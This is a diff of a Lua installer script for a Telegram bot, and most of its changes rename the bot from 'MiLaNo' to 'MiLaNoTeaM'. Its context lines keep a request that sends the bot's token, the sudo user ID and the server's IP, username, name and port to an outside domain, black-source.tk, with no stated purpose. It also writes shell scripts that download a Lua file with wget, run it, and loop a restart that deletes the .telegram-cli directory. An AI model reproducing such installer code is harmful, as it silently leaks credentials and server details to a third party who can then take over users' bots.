@@ -16,9 +16,9 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "BGBBB"
+s = "TttttX"
 
-q = "FBBBBB"
+q = "SHaHuM"
 
 token = "]]..Token..[["
 
@@ -67,11 +67,11 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
  local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-print("::Black::")
-local RunBot = io.open("MiLaNo", 'w')
+print("::MiLaNoTeaM::")
+local RunBot = io.open("MiLaNoTeaM", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/MiLaNo
+cd $HOME/MiLaNoTeaM
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr MiLaNo.lua
 wget "https://raw.githubusercontent.com/MILANO-source/MiLaNoTeaM/master/MiLaNo.lua"
@@ -84,11 +84,11 @@ RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/MiLaNo
+cd $HOME/MiLaNoTeaM
 while(true) do
 rm -fr ../.telegram-cli
-screen -S MiLaNo -X kill
-screen -S MiLaNo ./MiLaNo
+screen -S MiLaNoTeaM -X kill
+screen -S MiLaNoTeaM ./MiLaNoTeaM
 done
 ]])
 RunTs:close()
